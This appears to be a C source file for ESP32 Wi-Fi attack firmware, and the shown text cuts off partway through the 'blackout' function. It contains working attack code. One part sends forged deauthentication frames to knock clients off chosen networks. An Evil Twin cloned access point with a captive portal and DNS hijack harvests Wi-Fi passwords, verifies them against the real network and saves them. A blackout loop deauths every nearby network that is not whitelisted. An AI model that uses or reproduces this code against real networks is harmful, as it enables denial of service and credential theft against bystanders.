#include "wifi_attacks.h"
#include "wifi_scanner.h"
#include "wifi_wardrive.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_event.h"
#include "esp_timer.h"
#include "esp_http_server.h"
#include "esp_attr.h"
#include "esp_mac.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <dirent.h>
#include <sys/stat.h>

#ifndef PORTAL_HTML_DIR
#define PORTAL_HTML_DIR "/sdcard/lab/htmls"
#endif

static const char *TAG = "wifi_attacks";

// External whitelist functions from main.c
extern bool is_bssid_whitelisted(const uint8_t *bssid);
extern int whitelistedBssidsCount;
typedef struct {
    uint8_t bssid[6];
} whitelisted_bssid_t;
extern whitelisted_bssid_t whiteListedBssids[];

// Bypass ESP-IDF WiFi raw frame sanity check (like in working project)
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg; (void)arg2; (void)arg3; return 0;
}

// Attack state
static TaskHandle_t deauth_attack_task_handle = NULL;
static volatile bool deauth_attack_active = false;

static TaskHandle_t blackout_attack_task_handle = NULL;
static volatile bool blackout_attack_active = false;

static TaskHandle_t sae_attack_task_handle = NULL;
static volatile bool sae_attack_active = false;

static httpd_handle_t portal_server = NULL;
static volatile bool portal_active = false;
static TaskHandle_t dns_server_task_handle = NULL;
static int dns_server_socket = -1;

// Evil Twin state
static char evilTwinSSID[33] = "";
static char evilTwinPassword[64] = "";
static int connectAttemptCount = 0;
static bool last_password_wrong = false;
static volatile bool password_verification_in_progress = false;

// Karma mode flag - when true, portal will NOT attempt WiFi connection
static bool karma_mode = false;

// Deferred karma data save (to avoid SPI conflicts with display)
typedef struct {
    char ssid[33];
    char form_data[512];
    bool pending;
} pending_karma_save_t;
static pending_karma_save_t pending_karma_save = { .pending = false };

// Evil Twin event callback for UI notification
static evil_twin_event_cb_t evil_twin_event_callback = NULL;

// Helper function to emit Evil Twin events
static void emit_evil_twin_event_ex(evil_twin_event_t event, const char *ssid, const char *password, const char *mac) {
    if (evil_twin_event_callback) {
        evil_twin_event_data_t data;
        data.event = event;
        if (ssid) {
            strncpy(data.ssid, ssid, sizeof(data.ssid) - 1);
            data.ssid[sizeof(data.ssid) - 1] = '\0';
        } else {
            data.ssid[0] = '\0';
        }
        if (password) {
            strncpy(data.password, password, sizeof(data.password) - 1);
            data.password[sizeof(data.password) - 1] = '\0';
        } else {
            data.password[0] = '\0';
        }
        if (mac) {
            strncpy(data.mac, mac, sizeof(data.mac) - 1);
            data.mac[sizeof(data.mac) - 1] = '\0';
        } else {
            data.mac[0] = '\0';
        }
        evil_twin_event_callback(&data);
    }
}

static void emit_evil_twin_event(evil_twin_event_t event, const char *ssid, const char *password) {
    emit_evil_twin_event_ex(event, ssid, password, NULL);
}

void wifi_attacks_set_evil_twin_event_cb(evil_twin_event_cb_t cb) {
    evil_twin_event_callback = cb;
}

// Portal HTML files - populated from SD cache on refresh
static char sd_html_files[MAX_HTML_FILES][MAX_HTML_FILENAME];
static int sd_html_count = 0;

// External SD cache functions from main.c
extern int sd_cache_get_html_count(void);
extern const char* sd_cache_get_html_filename(int index);
extern void sd_cache_add_eviltwin_entry(const char *entry);
extern void sd_cache_add_portal_entry(const char *entry);

// Portal HTML buffer - dynamically allocated from PSRAM (1MB for large HTML files)
#define PORTAL_HTML_MAX_SIZE (1024 * 1024)  // 1 MB
static char *custom_portal_html = NULL;
static size_t custom_portal_html_size = 0;

// Statistics
static uint32_t stats_deauth_sent = 0;
static uint32_t stats_beacon_sent = 0;
static uint32_t stats_clients_connected = 0;
static blackout_stats_t blackout_stats = { 0 };
static portMUX_TYPE blackout_stats_spin = portMUX_INITIALIZER_UNLOCKED;

// Forward declarations for portal services used across sections
static esp_err_t start_portal_services(void);
static void stop_portal_services(void);
static esp_err_t portal_submit_handler(httpd_req_t *req);
static esp_err_t portal_handler(httpd_req_t *req);
static esp_err_t get_handler(httpd_req_t *req);
static esp_err_t save_handler(httpd_req_t *req);
static esp_err_t captive_detection_handler(httpd_req_t *req);
static esp_err_t captive_api_handler(httpd_req_t *req);
static void dns_server_task(void *pvParameters);
static void verify_password(const char* password);
static void save_evil_twin_password(const char* ssid, const char* password);
static void save_portal_data(const char* ssid, const char* form_data);
static void save_karma_data(const char* ssid, const char* form_data);
static void url_decode(const char* src, char* dst, size_t dst_size);
static void deauth_attack_task(void *pvParameters);

static bool is_html_extension(const char *name)
{
    if (!name) {
        return false;
    }
    const char *dot = strrchr(name, '.');
    if (!dot) {
        return false;
    }
    if (strcasecmp(dot, ".html") == 0 || strcasecmp(dot, ".htm") == 0) {
        return true;
    }
    return false;
}

static int compare_html_names(const void *a, const void *b)
{
    const char (*lhs)[MAX_HTML_FILENAME] = a;
    const char (*rhs)[MAX_HTML_FILENAME] = b;
    return strcasecmp(*lhs, *rhs);
}

void wifi_attacks_refresh_sd_html_list(void)
{
    // Populate local array from SD cache (already loaded at startup)
    sd_html_count = 0;
    
    int cache_count = sd_cache_get_html_count();
    for (int i = 0; i < cache_count && sd_html_count < MAX_HTML_FILES; i++) {
        const char *name = sd_cache_get_html_filename(i);
        if (name == NULL) continue;
        
        size_t name_len = strlen(name);
        if (name_len >= MAX_HTML_FILENAME) {
            ESP_LOGW(TAG, "Skipped HTML template (name too long): %s", name);
            continue;
        }
        
        strncpy(sd_html_files[sd_html_count], name, MAX_HTML_FILENAME - 1);
        sd_html_files[sd_html_count][MAX_HTML_FILENAME - 1] = '\0';
        sd_html_count++;
    }
    
    ESP_LOGI(TAG, "Portal HTML templates available: %d (from cache)", sd_html_count);
}

// ============================================================================
// PORTAL HTML BUFFER MANAGEMENT (PSRAM)
// ============================================================================

esp_err_t wifi_attacks_init_portal_html_buffer(void) {
    if (custom_portal_html != NULL) {
        ESP_LOGW(TAG, "Portal HTML buffer already allocated");
        return ESP_OK;
    }
    
    // Allocate 1MB buffer from PSRAM for large HTML files
    custom_portal_html = (char *)heap_caps_malloc(PORTAL_HTML_MAX_SIZE, MALLOC_CAP_SPIRAM);
    if (custom_portal_html == NULL) {
        ESP_LOGE(TAG, "Failed to allocate %d bytes from PSRAM for portal HTML buffer", PORTAL_HTML_MAX_SIZE);
        return ESP_ERR_NO_MEM;
    }
    
    custom_portal_html[0] = '\0';  // Initialize as empty string
    custom_portal_html_size = PORTAL_HTML_MAX_SIZE;
    
    ESP_LOGI(TAG, "Portal HTML buffer allocated: %d bytes from PSRAM at %p", 
             PORTAL_HTML_MAX_SIZE, (void*)custom_portal_html);
    
    // Verify it's actually in PSRAM
    if (heap_caps_get_allocated_size(custom_portal_html) > 0) {
        ESP_LOGI(TAG, "Verified: Buffer is in PSRAM");
    }
    
    return ESP_OK;
}

void wifi_attacks_free_portal_html_buffer(void) {
    if (custom_portal_html != NULL) {
        heap_caps_free(custom_portal_html);
        custom_portal_html = NULL;
        custom_portal_html_size = 0;
        ESP_LOGI(TAG, "Portal HTML buffer freed");
    }
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

static void url_decode(const char* src, char* dst, size_t dst_size) {
    int decoded_len = 0;
    for (const char *p = src; *p && decoded_len < (int)dst_size - 1; p++) {
        if (*p == '%' && p[1] && p[2]) {
            char hex[3] = {p[1], p[2], '\0'};
            dst[decoded_len++] = (char)strtol(hex, NULL, 16);
            p += 2;
        } else if (*p == '+') {
            dst[decoded_len++] = ' ';
        } else {
            dst[decoded_len++] = *p;
        }
    }
    dst[decoded_len] = '\0';
}

// ============================================================================
// DEAUTH ATTACK
// ============================================================================

// Deauth frame template
static const uint8_t deauth_frame_template[] = {
    0xC0, 0x00,                         // Frame Control
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    0x01, 0x00                          // Reason: Unspecified (matches working project)
};

static void deauth_attack_task(void *pvParameters) {
    uint8_t deauth_frame[sizeof(deauth_frame_template)];
    target_bssid_t targets[MAX_TARGET_BSSIDS];
    int target_count = wifi_scanner_get_targets(targets, MAX_TARGET_BSSIDS);
    
    if (target_count == 0) {
        ESP_LOGW(TAG, "No targets selected");
        deauth_attack_active = false;
        deauth_attack_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Log targeted networks
    ESP_LOGI(TAG, "Deauthenticating %d networks:", target_count);
    for (int i = 0; i < target_count && i < 5; i++) {  // Show first 5
        ESP_LOGI(TAG, "  - %s (Ch %d)", targets[i].ssid[0] ? targets[i].ssid : "Hidden", targets[i].channel);
    }
    if (target_count > 5) {
        ESP_LOGI(TAG, "  ... and %d more", target_count - 5);
    }
    
    while (deauth_attack_active && !g_operation_stop_requested) {
        // Don't send deauth ONLY when password verification is in progress
        // (STA is attempting to connect to real AP)
        if (password_verification_in_progress) {
            vTaskDelay(pdMS_TO_TICKS(500));
            continue;
        }
        
        for (int i = 0; i < target_count; i++) {
            if (!deauth_attack_active || g_operation_stop_requested) break;
            
            // Double check before changing channel
            if (password_verification_in_progress) {
                break;
            }
            
            // During Evil Twin with connected clients, only attack networks on same channel as first selected network
            if (portal_active && stats_clients_connected > 0 && target_count > 0) {
                uint8_t first_network_channel = targets[0].channel; // First selected network's channel
                if (targets[i].channel != first_network_channel) {
                    // Skip networks on different channels when clients are connected
                    continue;
                }
                // Only send deauth on same channel - no channel switch needed since we're already on this channel
            } else {
                // If no clients connected or not Evil Twin mode, do normal channel hopping
                vTaskDelay(50);  // Wait before channel change
                esp_wifi_set_channel(targets[i].channel, WIFI_SECOND_CHAN_NONE);
                vTaskDelay(50);  // Wait after channel change
            }
            
            // Prepare deauth frame
            memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));
            memcpy(&deauth_frame[10], targets[i].bssid, 6); // Source (AP)
            memcpy(&deauth_frame[16], targets[i].bssid, 6); // BSSID
            
            // Log deauth packet info: SSID, BSSID, Channel
            ESP_LOGI(TAG, "[DEAUTH] SSID: %-32s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %2d",
                     targets[i].ssid[0] ? targets[i].ssid : "(hidden)",
                     targets[i].bssid[0], targets[i].bssid[1], targets[i].bssid[2],
                     targets[i].bssid[3], targets[i].bssid[4], targets[i].bssid[5],
                     targets[i].channel);
            
            // Send multiple deauth frames (quiet - no spam)
            for (int j = 0; j < 5; j++) {
                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
                if (err == ESP_ERR_INVALID_ARG) {
                    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
                }
                if (err == ESP_OK) {
                    stats_deauth_sent++;
                }
                vTaskDelay(pdMS_TO_TICKS(10));
            }
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    ESP_LOGI(TAG, "Deauthentication stopped");
    deauth_attack_active = false;
    deauth_attack_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t wifi_attacks_start_deauth(void) {
    if (deauth_attack_active) {
        ESP_LOGW(TAG, "Deauth attack already running");
        return ESP_ERR_INVALID_STATE;
    }
    
    int target_count = wifi_scanner_get_target_count();
    if (target_count == 0) {
        ESP_LOGE(TAG, "No targets selected. Use 'select' command first.");
        return ESP_ERR_INVALID_ARG;
    }
    
    ESP_LOGI(TAG, "Starting deauth attack...");
    
    // Ensure WiFi is in APSTA mode so we can transmit raw frames on WIFI_IF_AP
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for raw frame transmission");
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    // If NOT in Evil Twin/Portal mode, hide the AP SSID to prevent broadcasting unwanted network
    // In Evil Twin mode (portal_active=true), AP config is already set with the cloned SSID
    if (!portal_active) {
        wifi_config_t ap_config = {
            .ap = {
                .ssid = "",
                .ssid_len = 0,
                .ssid_hidden = 1,  // Hide SSID - prevents beacon broadcast
                .channel = 1,
                .password = "",
                .max_connection = 0,  // No connections allowed
                .authmode = WIFI_AUTH_OPEN
            }
        };
        esp_wifi_set_config(WIFI_IF_AP, &ap_config);
        ESP_LOGI(TAG, "AP SSID hidden (standalone deauth mode)");
    }
    
    stats_deauth_sent = 0;
    deauth_attack_active = true;
    
    xTaskCreate(deauth_attack_task, "deauth_attack", 8192, NULL, 3, &deauth_attack_task_handle);
    
    return ESP_OK;
}

esp_err_t wifi_attacks_stop_deauth(void) {
    if (!deauth_attack_active) {
        return ESP_ERR_INVALID_STATE;
    }
    
    ESP_LOGI(TAG, "Stopping deauth attack...");
    deauth_attack_active = false;
    
    int wait_count = 0;
    while (deauth_attack_task_handle != NULL && wait_count < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait_count++;
    }
    
    return ESP_OK;
}

bool wifi_attacks_is_deauth_active(void) {
    return deauth_attack_active;
}

// ============================================================================
// PORTAL EVENT HANDLER (simplified - only client connect/disconnect)
// ============================================================================

static void portal_event_handler(void *arg, esp_event_base_t event_base,
                                 int32_t event_id, void *event_data) {
    if (event_base == WIFI_EVENT) {
        if (event_id == WIFI_EVENT_AP_STACONNECTED) {
            wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                     event->mac[0], event->mac[1], event->mac[2],
                     event->mac[3], event->mac[4], event->mac[5]);
            ESP_LOGI(TAG, "Client connected to Portal AP: %s", mac_str);
            stats_clients_connected++;
            emit_evil_twin_event_ex(EVIL_TWIN_EVENT_CLIENT_CONNECTED, evilTwinSSID, NULL, mac_str);
        } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
            wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                     event->mac[0], event->mac[1], event->mac[2],
                     event->mac[3], event->mac[4], event->mac[5]);
            ESP_LOGI(TAG, "Client disconnected from Portal AP: %s", mac_str);
            if (stats_clients_connected > 0) {
                stats_clients_connected--;
            }
            emit_evil_twin_event_ex(EVIL_TWIN_EVENT_CLIENT_DISCONNECTED, evilTwinSSID, NULL, mac_str);
        }
    }
}

// ============================================================================
// EVIL TWIN ATTACK
// ============================================================================

static void evil_twin_event_handler(void *arg, esp_event_base_t event_base,
                                    int32_t event_id, void *event_data) {
    if (event_base == WIFI_EVENT) {
        if (event_id == WIFI_EVENT_AP_STACONNECTED) {
            wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
            (void)event;  // Unused
            ESP_LOGI(TAG, "Client connected to Evil Twin AP");
            stats_clients_connected++;
            emit_evil_twin_event(EVIL_TWIN_EVENT_CLIENT_CONNECTED, evilTwinSSID, NULL);
        } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
            wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
            (void)event;  // Unused
            ESP_LOGI(TAG, "Client disconnected from Evil Twin AP");
            if (stats_clients_connected > 0) {
                stats_clients_connected--;
            }
            emit_evil_twin_event(EVIL_TWIN_EVENT_CLIENT_DISCONNECTED, evilTwinSSID, NULL);
        } else if (event_id == WIFI_EVENT_STA_CONNECTED) {
            // Password verification succeeded
            ESP_LOGI(TAG, "Password verified successfully: %s", evilTwinPassword);
            last_password_wrong = false;
            password_verification_in_progress = false;
            
            // Save password to SD card
            save_evil_twin_password(evilTwinSSID, evilTwinPassword);
            
            // Emit password verified event
            emit_evil_twin_event(EVIL_TWIN_EVENT_PASSWORD_VERIFIED, evilTwinSSID, evilTwinPassword);
        } else if (event_id == WIFI_EVENT_STA_DISCONNECTED) {
            (void)event_data; // event data not used
            
            // Check if we're verifying Evil Twin password
            if (strlen(evilTwinSSID) > 0) {
                connectAttemptCount++;
                
                if (connectAttemptCount >= 3) {
                    // Too many failed attempts - password is wrong
                    ESP_LOGI(TAG, "Password verification failed - incorrect password");
                    last_password_wrong = true;
                    password_verification_in_progress = false;
                    
                    // Emit password failed event
                    emit_evil_twin_event(EVIL_TWIN_EVENT_PASSWORD_FAILED, evilTwinSSID, NULL);
                    
                    // Disconnect STA to clear connection state before resuming deauth
                    esp_wifi_disconnect();
                    vTaskDelay(pdMS_TO_TICKS(100));
                    
                    // Resume deauth attack since password was wrong
                    if (!deauth_attack_active && deauth_attack_task_handle == NULL) {
                        deauth_attack_active = true;
                        BaseType_t result = xTaskCreate(
                            deauth_attack_task,
                            "deauth_attack",
                            8192,  // Same stack size as normal start
                            NULL,
                            3,     // Same priority as normal start
                            &deauth_attack_task_handle
                        );
                        
                        if (result != pdPASS) {
                            ESP_LOGE(TAG, "Failed to resume deauth attack");
                            deauth_attack_active = false;
                        }
                    }
                } else {
                    // Try again
                    esp_wifi_connect();
                }
            }
        }
    }
}

esp_err_t wifi_attacks_start_evil_twin(const char *ssid, const char *password) {
    if (strlen(ssid) == 0) {
        ESP_LOGE(TAG, "SSID cannot be empty");
        return ESP_ERR_INVALID_ARG;
    }
    
    // Only set karma_mode to false if not already in Karma mode
    // (wifi_attacks_start_portal sets it to true before calling this)
    if (!karma_mode) {
        ESP_LOGI(TAG, "Starting Evil Twin: %s", ssid);
    }
    
    strncpy(evilTwinSSID, ssid, 32);
    evilTwinSSID[32] = '\0';
    
    if (password) {
        strncpy(evilTwinPassword, password, 63);
        evilTwinPassword[63] = '\0';
    } else {
        evilTwinPassword[0] = '\0';
    }
    
    // Reset password verification flag
    last_password_wrong = false;
    connectAttemptCount = 0;
    
    // Get or create AP netif (like ensure_ap_mode in original)
    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap_netif) {
        // AP netif doesn't exist - need to stop WiFi, create it, and restart
        ESP_LOGI(TAG, "Creating AP netif...");
        esp_wifi_stop();
        ap_netif = esp_netif_create_default_wifi_ap();
        if (!ap_netif) {
            ESP_LOGE(TAG, "Failed to create AP netif");
            esp_wifi_start();
            apply_wifi_power_settings();
            return ESP_FAIL;
        }
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        esp_wifi_start();
        apply_wifi_power_settings();
        vTaskDelay(pdMS_TO_TICKS(500));
    } else {
        // AP netif exists - ensure we're in APSTA mode for raw frame transmission
        wifi_mode_t mode;
        esp_wifi_get_mode(&mode);
        if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
            ESP_LOGI(TAG, "Switching WiFi to APSTA mode for Evil Twin");
            esp_wifi_set_mode(WIFI_MODE_APSTA);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
    
    // Stop DHCP server to configure custom IP
    esp_netif_dhcps_stop(ap_netif);
    
    // Set static IP 172.0.0.1 for AP
    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    
    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set AP IP to 172.0.0.1: %s", esp_err_to_name(ret));
    }
    
    // Configure AP with Evil Twin SSID (with Zero Width Space)
    wifi_config_t ap_config = {
                .ap = {
                    .ssid = "",
                    .ssid_len = 0,
                    .channel = 1,
                    .password = "",
                    .max_connection = 4,
                    .authmode = WIFI_AUTH_OPEN
                }
    };
    size_t ssid_len = strlen(evilTwinSSID);
    
    // Add Zero Width Space (UTF-8: 0xE2 0x80 0x8B) to prevent iPhone grouping
    if (ssid_len + 3 <= sizeof(ap_config.ap.ssid)) {
        memcpy(ap_config.ap.ssid, evilTwinSSID, ssid_len);
        ap_config.ap.ssid[ssid_len] = 0xE2;
        ap_config.ap.ssid[ssid_len + 1] = 0x80;
        ap_config.ap.ssid[ssid_len + 2] = 0x8B;
        ap_config.ap.ssid_len = ssid_len + 3;
    } else {
        // SSID too long, just copy without Zero Width Space
        strncpy((char *)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
        ap_config.ap.ssid_len = ssid_len;
    }
    
    if (strlen(evilTwinPassword) > 0) {
        strcpy((char *)ap_config.ap.password, evilTwinPassword);
        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    } else {
        ap_config.ap.authmode = WIFI_AUTH_OPEN;
    }

    // Set AP config (mode is already APSTA from netif creation or init)
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    
    // Register event handler for password verification (WIFI_EVENT_STA_CONNECTED/DISCONNECTED)
    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &evil_twin_event_handler, NULL);
    
    // Start DHCP server
    ret = esp_netif_dhcps_start(ap_netif);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
    }
    
    vTaskDelay(pdMS_TO_TICKS(1000)); // Wait for AP to stabilize
    
    ESP_LOGI(TAG, "Evil Twin AP active: %s", evilTwinSSID);
    stats_clients_connected = 0;
    
    // Start captive portal services and deauth workflow
    ESP_LOGI(TAG, "Captive portal started on 172.0.0.1");
    start_portal_services();
    
    // Emit portal deployed event
    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
    
    wifi_scanner_save_target_bssids();
    wifi_attacks_start_deauth();
    
    // Emit deauth started event
    emit_evil_twin_event(EVIL_TWIN_EVENT_DEAUTH_STARTED, evilTwinSSID, NULL);
    
    return ESP_OK;
}

esp_err_t wifi_attacks_stop_evil_twin(void) {
    // Only stop if portal is actually active
    if (!portal_active) {
        return ESP_OK;
    }
    
    ESP_LOGI(TAG, "Stopping Evil Twin attack...");
    
    // Stop deauth attack first
    wifi_attacks_stop_deauth();
    
    // Reset Karma mode
    karma_mode = false;
    
    esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &evil_twin_event_handler);
    
    // Stop captive portal services if running
    stop_portal_services();
    
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_start();
    apply_wifi_power_settings();

    ESP_LOGI(TAG, "Evil Twin stopped");
    return ESP_OK;
}

// ============================================================================
// BLACKOUT ATTACK
// ============================================================================

static void blackout_attack_task(void *pvParameters) {
    (void)pvParameters;
    ESP_LOGI(TAG, "Blackout attack task started");
    
    stats_deauth_sent = 0;
    portENTER_CRITICAL(&blackout_stats_spin);
    blackout_stats.networks_attacked = 0;
    blackout_stats.status = BLACKOUT_STATUS_RESCANNING;
    blackout_stats.active = true;
    portEXIT_CRITICAL(&blackout_stats_spin);
    
    // Main loop: continuously scan and attack for 100 cycles each iteration
    while (blackout_attack_active && !g_operation_stop_requested) {
        ESP_LOGI(TAG, "Starting blackout cycle: scanning all networks...");
        
        // Start background scan
        esp_err_t scan_result = wifi_scanner_start_scan();
        if (scan_result != ESP_OK) {
            ESP_LOGI(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait 1 second before retry
            continue;
        }
        
        // Wait for scan to complete
        int timeout = 0;
        while (wifi_scanner_is_scanning() && timeout < 200 && blackout_attack_active && !g_operation_stop_requested) {
            vTaskDelay(pdMS_TO_TICKS(100));
            timeout++;
        }
        
        if (g_operation_stop_requested) {
            ESP_LOGI(TAG, "Blackout attack: Stop requested during scan");
            break;
        }
        
        if (wifi_scanner_is_scanning()) {
            ESP_LOGI(TAG, "Scan timeout, retrying...");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        uint16_t scan_count = wifi_scanner_get_count();
        if (!wifi_scanner_is_done() || scan_count == 0) {
            ESP_LOGI(TAG, "No scan results available, retrying...");
            portENTER_CRITICAL(&blackout_stats_spin);
            blackout_stats.networks_attacked = 0;
            blackout_stats.status = BLACKOUT_STATUS_RESCANNING;
            portEXIT_CRITICAL(&blackout_stats_spin);
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        ESP_LOGI(TAG, "Found %d networks, sorting by channel...", scan_count);
        
        // Get scan results
        wifi_ap_record_t *scan_results = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * scan_count);
        if (!scan_results) {
            ESP_LOGE(TAG, "Failed to allocate memory for scan results");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        int got = wifi_scanner_get_results(scan_results, scan_count);
        if (got == 0) {
            ESP_LOGI(TAG, "No results returned");
            portENTER_CRITICAL(&blackout_stats_spin);
            blackout_stats.networks_attacked = 0;
            blackout_stats.status = BLACKOUT_STATUS_RESCANNING;
            portEXIT_CRITICAL(&blackout_stats_spin);
            free(scan_results);
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        // Sort networks by channel (ascending order)
        for (int i = 0; i < got - 1; i++) {
            for (int j = 0; j < got - i - 1; j++) {
                if (scan_results[j].primary > scan_results[j + 1].primary) {
                    wifi_ap_record_t temp = scan_results[j];
                    scan_results[j] = scan_results[j + 1];
                    scan_results[j + 1] = temp;
                }
            }
        }
        
        // Build local target list directly from scan results (don't use global scanner structures)
        target_bssid_t targets[MAX_TARGET_BSSIDS];
        int target_count = (got > MAX_TARGET_BSSIDS) ? MAX_TARGET_BSSIDS : got;
        
        for (int i = 0; i < target_count; i++) {
            memcpy(targets[i].bssid, scan_results[i].bssid, 6);
            strncpy(targets[i].ssid, (const char *)scan_results[i].ssid, 32);
            targets[i].ssid[32] = '\0';
            targets[i].channel = scan_results[i].primary;
            targets[i].last_seen = esp_timer_get_time() / 1000;
            targets[i].active = true;
        }
        
        portENTER_CRITICAL(&blackout_stats_spin);
        blackout_stats.networks_attacked = target_count;
        blackout_stats.status = BLACKOUT_STATUS_ATTACKING;
        portEXIT_CRITICAL(&blackout_stats_spin);
        
        // Display whitelist information
        if (whitelistedBssidsCount > 0) {
            ESP_LOGI(TAG, "Attacking networks except whitelist:");
            for (int i = 0; i < whitelistedBssidsCount && i < 10; i++) {  // Show first 10
                ESP_LOGI(TAG, "  [Protected] %02X:%02X:%02X:%02X:%02X:%02X",
                         whiteListedBssids[i].bssid[0], whiteListedBssids[i].bssid[1],
                         whiteListedBssids[i].bssid[2], whiteListedBssids[i].bssid[3],
                         whiteListedBssids[i].bssid[4], whiteListedBssids[i].bssid[5]);
            }
            if (whitelistedBssidsCount > 10) {
                ESP_LOGI(TAG, "  ... and %d more protected networks", whitelistedBssidsCount - 10);
            }
        } else {
            ESP_LOGI(TAG, "Attacking all networks (no whitelist loaded)");
        }
        
        ESP_LOGI(TAG, "Attacking %d networks for 100 cycles...", target_count);
        
        // Attack all networks for exactly 100 cycles
        int attack_cycles = 0;
        const int MAX_ATTACK_CYCLES = 100;
        
        uint8_t deauth_frame[sizeof(deauth_frame_template)];
        
        while (attack_cycles < MAX_ATTACK_CYCLES && blackout_attack_active && !g_operation_stop_requested) {
            // Send deauth frames to all networks
            for (int i = 0; i < target_count; i++) {
                if (!blackout_attack_active || g_operation_stop_requested) break;
                
                // Check if BSSID is whitelisted - skip if it is
                if (is_bssid_whitelisted(targets[i].bssid)) {
                    continue;
                }
                
                // Set channel
                vTaskDelay(pdMS_TO_TICKS(50));
                esp_wifi_set_channel(targets[i].channel, WIFI_SECOND_CHAN_NONE);
                vTaskDelay(pdMS_TO_TICKS(50));
                
                // Send deauth frame (template already has broadcast destination)
                memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));
                memcpy(&deauth_frame[10], targets[i].bssid, 6); // Source: AP BSSID
                memcpy(&deauth_frame[16], targets[i].bssid, 6); // BSSID
                
                // Log deauth packet info: SSID, BSSID, Channel
                ESP_LOGI(TAG, "[BLACKOUT] SSID: %-32s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %2d",
                         targets[i].ssid[0] ? targets[i].ssid : "(hidden)",
                         targets[i].bssid[0], targets[i].bssid[1], targets[i].bssid[2],
                         targets[i].bssid[3], targets[i].bssid[4], targets[i].bssid[5],
                         targets[i].channel);
                
                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
                stats_deauth_sent++;
            }
            
            attack_cycles++;
            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between attack cycles
        }
        
        free(scan_results);
        
        if (g_operation_stop_requested) {
            ESP_LOGI(TAG, "Blackout attack: Stop requested during attack");
            break;
        }
        
        ESP_LOGI(TAG, "Attack cycle completed, starting new scan...");
        portENTER_CRITICAL(&blackout_stats_spin);
        blackout_stats.status = BLACKOUT_STATUS_RESCANNING;
        portEXIT_CRITICAL(&blackout_stats_spin);
        
        // Immediately start next scan cycle (no waiting)
    }
    
    ESP_LOGI(TAG, "Blackout attack task finished");
    portENTER_CRITICAL(&blackout_stats_spin);
    blackout_stats.active = false;
    blackout_stats.status = BLACKOUT_STATUS_RESCANNING;
    portEXIT_CRITICAL(&blackout_stats_spin);
    blackout_attack_active = false;
    blackout_attack_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t wifi_attacks_start_blackout(void) {
    if (blackout_attack_active) {
        ESP_LOGW(TAG, "Blackout attack already running");
        return ESP_ERR_INVALID_STATE;
    }
    
